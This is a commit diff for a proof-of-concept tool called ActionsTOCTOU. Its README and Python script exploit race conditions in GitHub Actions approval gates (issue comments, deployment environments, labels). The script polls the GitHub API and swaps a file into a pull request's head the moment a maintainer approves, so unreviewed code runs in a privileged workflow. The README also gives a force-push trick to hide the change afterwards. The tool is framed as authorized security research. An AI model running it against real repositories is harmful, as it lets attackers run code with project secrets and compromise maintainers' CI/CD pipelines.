fd0954ea6e1f564f6fad6c7ab2eeff5977342840
AdnaneKhan <AdnaneKhan@users.noreply.github.com>
2024-04-12 13:45:06 -0400

    Update POC and flesh out README.

--- README.md
+++ README.md
@@ -1,24 +1,112 @@
 # ActionsTOCTOU
 
-This PoC script contains code to monitor for an approval event (either a comment, label, or deployment environmnet approval) and then quickly replaces a file in the PR head with on specified.
+This PoC contains code to monitor for an approval event (either a comment, label, or deployment environment approval) and then quickly replaces a file in the PR head with a local file specified as a parameter.
 
-This could be a script, an action.yml file. It really depends on the target workflow.
+This could be a script, an `action.yml` file, a `package.json` file. It really depends on the target workflow.
 
-## Issue Ops TOCTOU
+This PoC expands upon research presented in [GitHub's Pwn Requests Article](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) and Nikita Stupin's [PwnHub](https://github.com/nikitastupin/pwnhub) repository.
 
-This is probably the most common form of the vulnerability. The `issue_comment` trigger does
-not contain the pull request head sha, so most workflows that implement issue ops along with
-a check that the commenter is in fact a maintainer tend to use the API to get the PR head information or use the PR number to create a ref. Regardless of what workflows do, they end up
-getting the latest commit from the PR. This leaves a short window between the time the maintainer
-makes the comment to approve a run and the workflow actually checking out the PR head.
+## Vulnerability Details
 
-If the workflow uses secrets or runs the PR code in some kind of privileged context, then an
-attacker can exploit the race condition.
+This PoC supports three variations of Actions TOCTOU - these are the most common that you will see in the wild. There might be other more exotic examples, and if so, feel free to create an issue and I'll see if I can add it.
 
-## Deployment Environment Approval TOCTOU
+In all three cases the aim is to run un-reviewed code in a privileged workflow that should be running code that has _per-run_ approval.
 
-If a workflow uses pull_request_target along with the head.ref instead of head.sha, then
-an attacker can again try to win the race condition and quickly update their PR as soon as they
-see that the maintainer has approved the deployment.
+This PoC focuses on Public Poisoned Pipeline Execution, but it is likely that these techniques also apply to internal CI/CD red-team scenarios (such as production deployment workflows that require 2PR).
+
+### Issue Ops TOCTOU
+
+This is probably the most common form of the vulnerability. The `issue_comment` trigger does not contain the pull request head sha, so most workflows that implement issue ops to run PR code tend to follow a flow like this:
+
+* Permission Check: Determine if the triggering actor meets some authorization criteria.
+* Ref Calculation: Calculates the PR ref by using a format expression with the PR number or using the GitHub API to retrieve the head sha.
+* Checkout: Uses an action or a CLI command to check out the PR code.
+
+Regardless of what workflows do, they end up getting the latest commit from the PR. This leaves a short window between the time the maintainer makes the comment to approve trigger run and the workflow actually checking out the PR head.
 
 
+### Deployment Environment Approval TOCTOU
+
+Often, maintainers will use a GitHub Actions deployment environment as a gate check for external pull requests that need access to secrets. When a deployment
+environment has a [required_reviewers](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment#required-reviewers) protection rule, one of the maintainers must approve the deployment in order for the workflow to run.
+
+The workflow's metadata will be generated at the time the approval is requested. If someone updates the PR head prior to the approval, then it will generate a new approval request and the old one will remain. Normally this is not a problem, maintainers will review the newest code and ignore the old one.
+
+Depending on how the workflow is configured, there is an opportunity to exploit a race condition. This kind of attack is *NOT* social engineering in the traditional sense, because there no way way to differentiate a legitimate workflow pending approval for unit tests and one where an attacker is waiting until the moment of approval to quickly push a new change.
+
+If a workflow uses `pull_request_target` along with `head.ref` (or a variation of it) instead of `head.sha`, then an attacker can try to win a race condition and quickly update their PR as soon as they see that the maintainer has approved the deployment.
+
+Typically, it takes a few second between the maintainer approving a deployment (which changes its state visible through GitHub's API) and a runner picking up the workflow. As a result, this is a very easy race condition to win.
+
+### Label Gating TOCTOU
+
+Finally, another gating mechanism is when a maintainer configures a workflow to
+run on `pull_request_target` along with just the `labeled` event. In this scenario the workflow will run on the `labeled` event, but it will not run
+if the PR creator updates the PR head code (since the `synchronize` event is not present - if it is then there is no need to win a race condition, simply update the PR).
+
+If the workflow checks out code from a mutable reference, then an attacker has a few seconds to update their PR head, and then the workflow will run newer code. For added stealth, an attacker can force push their malicious changes off their fork once the workflow starts:
+
+```
+git reset --soft HEAD~1
+git push --force
+```
+
+
+## Tool Usage
+
+**This PoC tool is intended to support authorized vulnerability research only. Only use it against repositories that you control or repositories that you have permission to test. I am not responsible for the consequences of illegal use.**
+
+
+### Preparation
+
+The tool is written in python3 and only has a dependency on `requests`.
+
+In order to use it, you need to create a GitHub PAT with the `repo` scope, and if the file you are modifying is within the `.github/workflows` directory, then you will need the `workflow` scope as well. The user must have write access to the fork as well.
+
+The tool expects the token to be set to the `GH_TOKEN` environment variable. The tool will check every 500ms.
+
+GitHub's API has a rate limit of 5000/hour, a request every 500ms will probably exhaust it. You should not run into rate limit issues testing a POC usingt two accounts that you control. If you are using this tool as part of a red team or adversary emulation exercise, then modify as you need - the code is simple.
+
+### Examples
+
+The tool's help text is self-explanatory. If you use the GitHub CLI, you can pass the token like this:
+
+```
+ GH_TOKEN=`gh auth token` python3 actions_toctou.py -h
+usage: actions_toctou.py [-h] [--target-pr TARGET_PR] --repo REPO --fork-repo FORK_REPO --fork-branch FORK_BRANCH --mode
+                         {comment,environment,label} [--search-string SEARCH_STRING] --update-file UPDATE_FILE
+                         --update-path UPDATE_PATH
+
+Monitor GitHub issue comments.
+
+options:
+  -h, --help            show this help message and exit
+  --target-pr TARGET_PR
+                        Target pull request number.
+  --repo REPO           Repository in the format 'owner/repo'.
+  --fork-repo FORK_REPO
+                        Fork repository in the format 'owner/repo'.
+  --fork-branch FORK_BRANCH
+                        Branch name in the fork repository.
+  --mode {comment,environment,label}
+                        Mode of operation: 'comment', 'environment' or 'label'.
+  --search-string SEARCH_STRING
+                        Specific issue comment prefix or full label to search for.
+  --update-file UPDATE_FILE
+                        Path to the local file to be updated.
+  --update-path UPDATE_PATH
+                        Path in the repository where the file should be updated.
+```
+
+`search-string` is required for the comment and label mode. It is not used for the environment mode.
+
+`update-file` is a path to a local file that will be written to the PR head.
+
+`update-path` is the path in the fork to write the file to. It will be created if it does not exist, otherwise
+it will update it.
+
+
+## References
+
+* https://github.com/nikitastupin/pwnhub/blob/main/scripts/exploitation/push-on-label-or-comment.sh
+* https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
--- actions_toctou.py
+++ actions_toctou.py
@@ -5,66 +5,161 @@ import os
 import base64
 from datetime import datetime, timedelta
 
-def get_file_sha(repo, file_path, branch, token):
+token = os.environ.get("GH_TOKEN")
+if not token:
+    print("GH_TOKEN environment variable not set.")
+    exit(1)
+
+AUTH_HEADER = {
+    "Authorization": f"Bearer {token}",
+    "Content-Type": "application/json"
+}
+
+
+def get_file_sha(repo, file_path, branch):
+    """
+    Get the SHA of a file in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    file_path (str): The path to the file in the repository.
+    branch (str): The branch where the file is located.
+
+    Returns:
+    str: The SHA of the file, or None if the file does not exist.
+    """
     url = f"https://api.github.com/repos/{repo}/contents/{file_path}"
-    headers = {
-        "Authorization": f"Bearer {token}"
-    }
+
     params = {
         "ref": branch
     }
-    response = requests.get(url, headers=headers, params=params)
+    response = requests.get(url, headers=AUTH_HEADER, params=params)
     if response.status_code == 200:
         return response.json()["sha"]
     else:
         return None
 
-def get_deployment_statuses(repo, deployment_id, token):
+def get_deployment_statuses(repo, deployment_id):
+    """
+    Get the statuses of a deployment in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    deployment_id (int): The ID of the deployment.
+
+    Returns:
+    list: A list of deployment statuses.
+    """
     url = f"https://api.github.com/repos/{repo}/deployments/{deployment_id}/statuses"
-    headers = {
-        "Authorization": f"Bearer {token}"
-    }
-    response = requests.get(url, headers=headers)
+
+    response = requests.get(url, headers=AUTH_HEADER)
     return response.json()
 
-def get_head_commit(repo, target_pr, token):
+def get_head_commit(repo, target_pr):
+    """
+    Get the head commit of a pull request in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    target_pr (int): The number of the pull request.
+
+    Returns:
+    str: The SHA of the head commit.
+    """
     url = f"https://api.github.com/repos/{repo}/pulls/{target_pr}"
-    headers = {
-        "Authorization": f"Bearer {token}"
-    }
-    response = requests.get(url, headers=headers)
+
+    response = requests.get(url, headers=AUTH_HEADER)
     return response.json()["head"]["sha"]
 
-def get_deployments(repo, head_commit, token):
+def get_deployments(repo, head_commit):
+    """
+    Get the deployments associated with a commit in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    head_commit (str): The SHA of the commit.
+
+    Returns:
+    list: A list of deployments.
+    """
     url = f"https://api.github.com/repos/{repo}/deployments"
-    headers = {
-        "Authorization": f"Bearer {token}"
-    }
+
     params = {
         "sha": head_commit
     }
-    response = requests.get(url, headers=headers, params=params)
-    return response.json()
+    response = requests.get(url, headers=AUTH_HEADER, params=params)
 
-def get_issue_comments(repo, target_pr, token):
+    if response.status_code == 200:
+        return response.json()
+    else:
+        print(f"Error getting deployments, code: {str(response.status_code)}")
+        return []
+
+def get_labels(repo, target_pr):
+    """
+    Get the labels of an issue in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    target_pr (int): The number of the issue.
+
+    Returns:
+    list: A list of labels.
+    """
+    url = f"https://api.github.com/repos/{repo}/issues/{target_pr}/labels"
+    response = requests.get(url, headers=AUTH_HEADER)
+
+    labels = []
+    if response.status_code == 200:
+        # Parse the JSON response and extract the labels
+        labels = [label["name"] for label in response.json()]
+    else:
+        print(f"Error getting labels, code: {str(response.status_code)}")
+    return labels
+
+def get_issue_comments(repo, target_pr):
+    """
+    Get the comments of an issue in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    target_pr (int): The number of the issue.
+
+    Returns:
+    list: A list of comments.
+    """
     url = f"https://api.github.com/repos/{repo}/issues/{target_pr}/comments"
-    headers = {
-        "Authorization": f"Bearer {token}"
-    }
+
     since = (datetime.utcnow() - timedelta(minutes=2)).replace(microsecond=0).isoformat()
     params = {
         "per_page": 5,
         "since": since+"Z"
     }
-    response = requests.get(url, headers=headers, params=params)
-    return response.json()
+    response = requests.get(url, headers=AUTH_HEADER, params=params)
 
-def create_or_update_file(fork_repo, fork_branch,file_content,file_path, token, file_sha):
+    if response.status_code == 200:
+        return response.json()
+    else:
+        print(f"Error getting issue comments, code: {str(response.status_code)}")
+        return []
+
+def create_or_update_file(fork_repo, fork_branch,file_content,file_path, file_sha):
+    """
+    Create or update a file in a GitHub repository.
+
+    Parameters:
+    fork_repo (str): The repository in the format 'owner/repo'.
+    fork_branch (str): The branch where the file should be created or updated.
+    file_content (bytes): The content of the file.
+    file_path (str): The path to the file in the repository.
+    file_sha (str): The SHA of the file, or None if the file does not exist.
+
+    Returns:
+    None
+    """
+
     url = f"https://api.github.com/repos/{fork_repo}/contents/{file_path}"
-    headers = {
-        "Authorization": f"Bearer {token}",
-        "Content-Type": "application/json"
-    }
+
     data = {
         "message": "[skip ci] update",
         "content": base64.b64encode(file_content).decode(),
@@ -73,7 +168,7 @@ def create_or_update_file(fork_repo, fork_branch,file_content,file_path, token, 
 
     if file_sha:
         data["sha"] = file_sha
-    response = requests.put(url, headers=headers, json=data)
+    response = requests.put(url, headers=AUTH_HEADER, json=data)
     if response.status_code in [201, 200]:
         print(f"{file_path} file created or updated in the fork repository.")
     else:
@@ -81,46 +176,70 @@ def create_or_update_file(fork_repo, fork_branch,file_content,file_path, token, 
         print("Response:", response.json())
 
 def main(target_pr, repo, fork_repo, fork_branch, search_string, mode, update_file, update_path):
-    token = os.environ.get("GH_TOKEN")
-    if not token:
-        print("GH_TOKEN environment variable not set.")
-        return
-    file_sha = get_file_sha(fork_repo, update_path, fork_branch, token)
+    """
+    Main function to monitor GitHub issue comments and create or update a file in a repository.
+
+    Parameters:
+    target_pr (int): The number of the target pull request.
+    repo (str): The repository in the format 'owner/repo'.
+    fork_repo (str): The fork repository in the format 'owner/repo'.
+    fork_branch (str): The branch in the fork repository.
+    search_string (str): The specific issue comment prefix or full label to search for.
+    mode (str): The mode of operation: 'comment', 'environment' or 'label'.
+    update_file (str): The path to the local file to be updated.
+    update_path (str): The path in the repository where the file should be updated.
+
+    Returns:
+    None
+    """
+    file_sha = get_file_sha(fork_repo, update_path, fork_branch)
+    with open(update_file, "rb") as file:
+        file_contents = file.read()
+
     if mode == 'comment':
         while True:
-            issue_comments = get_issue_comments(repo, target_pr, token)
+            issue_comments = get_issue_comments(repo, target_pr)
             if issue_comments:
                 most_recent_comment = issue_comments[-1]["body"].strip() 
                 if most_recent_comment.startswith(search_string):
                     print(f"Most recent comment starts with '{search_string}'. Proceeding to create {update_path} file.")
-                    with open(update_file, "rb") as file:
-                        file_contents = file.read()
-                    create_or_update_file(fork_repo, fork_branch, file_contents, update_path, token, file_sha)
+                  
+                    create_or_update_file(fork_repo, fork_branch, file_contents, update_path, file_sha)
                     break
                 else:
-                    print(f"Most recent comment does not start with '{search_string}'. Retrying in 350ms...")
+                    print(f"Most recent comment does not start with '{search_string}'. Retrying in 500ms...")
             else:
-                print("No issue comments found. Retrying in 350ms...")
-            time.sleep(0.35)
+                print("No issue comments found. Retrying in 500ms...")
+            time.sleep(0.5)
     elif mode == 'environment':
-        head_commit = get_head_commit(repo, target_pr, token)
-        deployments = get_deployments(repo, head_commit, token)
+        head_commit = get_head_commit(repo, target_pr)
+        deployments = get_deployments(repo, head_commit)
         if deployments:
             deployment_id = deployments[0]["id"]
             while True:
-                deployment_statuses = get_deployment_statuses(repo, deployment_id, token)
+                deployment_statuses = get_deployment_statuses(repo, deployment_id)
                 if any(status["state"] == "queued" for status in deployment_statuses):
                     print(f"Deployment status is 'queued'. Proceeding to create {update_path}.")
 
-                    with open(update_file, "rb") as file:
-                        file_contents = file.read()
-                    create_or_update_file(fork_repo, fork_branch, file_contents, update_path, token, file_sha)
+                    create_or_update_file(fork_repo, fork_branch, file_contents, update_path, file_sha)
                     break
                 else:
-                    print("Deployment status is not 'queued'. Retrying in 350ms...")
-                    time.sleep(0.35)
+                    print("Deployment status is not 'queued'. Retrying in 500ms...")
+                    time.sleep(0.50)
         else:
             print("No deployments found for the head commit.")
+    elif mode == 'label':
+        while True:
+            labels = get_labels(repo, target_pr)
+        
+            if search_string in labels:
+                print(f"Label {search_string} found. Proceeding to create {update_path}.")
+                create_or_update_file(fork_repo, fork_branch, file_contents, update_path, file_sha)
+                break
+            else:
+                print(f"Label {search_string} not found. Retrying in 500ms...")
+                time.sleep(.50)
+
     else:
         print("Invalid mode specified. Please use either 'comment' or 'environment'.")
 
@@ -130,12 +249,16 @@ if __name__ == "__main__":
     parser.add_argument("--repo", type=str, required=True,help="Repository in the format 'owner/repo'.")
     parser.add_argument("--fork-repo", type=str, required=True, help="Fork repository in the format 'owner/repo'.")
     parser.add_argument("--fork-branch", type=str, required=True, help="Branch name in the fork repository.")
-    parser.add_argument("--mode", type=str, required=True, choices=["comment", "environment"], help="Mode of operation: 'comment' or 'environment'.")
-    parser.add_argument("--search-string", type=str, required=False, default="", help="Comment ops string to search for")
+    parser.add_argument("--mode", type=str, required=True, choices=["comment", "environment", "label"], help="Mode of operation: 'comment', 'environment' or 'label'.")
+    parser.add_argument("--search-string", type=str, required=False, default="", help="Specific issue comment prefix or full label to search for.")
     parser.add_argument("--update-file", type=str, required=True, help="Path to the local file to be updated.")
     parser.add_argument("--update-path", type=str, required=True, help="Path in the repository where the file should be updated.")
 
-
     args = parser.parse_args()
+
+    if args.mode in ["comment", "label"]:
+        if not args.search_string:
+            parser.error("Search string is required for 'comment' and 'label' modes.")
+
 
     main(args.target_pr, args.repo, args.fork_repo, args.fork_branch, args.search_string, args.mode, args.update_file, args.update_path)
